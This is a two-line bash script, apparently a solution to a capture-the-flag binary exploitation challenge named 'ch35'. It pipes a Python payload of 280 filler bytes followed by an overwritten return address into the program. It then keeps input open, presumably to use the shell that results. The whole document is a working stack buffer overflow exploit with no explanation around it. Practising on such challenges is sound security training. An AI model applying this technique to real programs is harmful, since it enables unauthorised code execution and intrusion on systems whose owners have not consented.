#!/bin/bash
( python -c 'print "A"*280 + "\xcd\x06\x40\x00\x00\x00\x00\x00"'; cat) | ./ch35
